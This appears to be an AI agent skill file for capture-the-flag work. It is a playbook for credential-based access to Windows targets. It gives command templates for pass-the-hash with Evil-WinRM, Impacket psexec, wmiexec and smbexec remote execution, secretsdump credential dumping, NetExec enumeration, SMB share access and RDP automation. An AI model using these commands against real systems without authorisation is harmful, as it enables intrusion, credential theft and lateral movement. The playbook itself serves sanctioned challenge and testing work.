---
name: windows-access
description: Windows credential-based access methods (Evil-WinRM, Impacket, nxc, SMB) and RDP playbook. Load when you need to access a Windows target with known credentials or use RDP.
---

# Windows Target Playbook (Credential-Based Access)

Use this priority order. Only fall back to RDP if all text-based methods fail
or the challenge explicitly requires GUI interaction.

## 1. Evil-WinRM (port 5985-5986)
```bash
safe-run evil-winrm -i <TARGET> -u <USER> -p '<PASS>'
safe-run evil-winrm -i <TARGET> -u <USER> -H <NTLM>   # pass-the-hash
```
Full PowerShell session. Upload/download files. Load PS scripts with `-s`.

## 2. Impacket psexec / wmiexec / smbexec
```bash
safe-run impacket-psexec '<DOMAIN>/<USER>:<PASS>@<TARGET>'
safe-run impacket-wmiexec '<DOMAIN>/<USER>:<PASS>@<TARGET>'
safe-run impacket-smbexec '<DOMAIN>/<USER>:<PASS>@<TARGET>'
```
`wmiexec` is stealthier; `psexec` gives SYSTEM; `smbexec` when psexec blocked.

## 3. Impacket secretsdump (no shell needed)
```bash
safe-run impacket-secretsdump '<DOMAIN>/<USER>:<PASS>@<TARGET>'
```

## 4. NetExec (credential validation + quick enum)
```bash
safe-run netexec smb <TARGET> -u <USER> -p '<PASS>'        # Pwn3d! = admin
safe-run netexec winrm <TARGET> -u <USER> -p '<PASS>'
safe-run netexec smb <TARGET> -u <USER> -p '<PASS>' --shares --users
```

## 5. SMB direct file access
```bash
safe-run smbclient '//<TARGET>/C$' -U '<DOMAIN>/<USER>%<PASS>'
```
If you know the flag path, just `get` it. No shell needed.

---

# RDP Playbook (GUI-Required Challenges Only)

`agent-rdp` runs as a headless protocol client with UI Automation support.

## Quick-Start
```bash
safe-run agent-rdp connect --host <IP> --username <USER> --password '<PASS>' --enable-win-automation
safe-run agent-rdp automate snapshot -i          # accessibility tree (preferred)
safe-run agent-rdp screenshot --output /workspace/loot/screenshots/desktop.png
safe-run agent-rdp mouse click @e1               # click by element index
safe-run agent-rdp clipboard set "whoami /priv"  # clipboard for reliable typing
safe-run agent-rdp keyboard press "ctrl+v"
safe-run agent-rdp keyboard press enter
safe-run agent-rdp disconnect
```

## Rules
1. **Inspect trees before pixels.** `automate snapshot -i` first; target by
   semantic index (`@e1`). Only fall back to coordinates for canvas controls.
2. **Clipboard over keystrokes.** `clipboard set` + `ctrl+v` prevents dropped
   characters.
3. **Batch actions.** Plan sequences, execute, wait 2-3s, then snapshot once.
4. **Abandon after 5 min of fighting.** Try evil-winrm, wmiexec, or smbclient.

## Opening Applications
```bash
safe-run agent-rdp keyboard press super
sleep 1
safe-run agent-rdp keyboard type "cmd"
safe-run agent-rdp keyboard press enter
sleep 2
safe-run agent-rdp automate snapshot -i
```
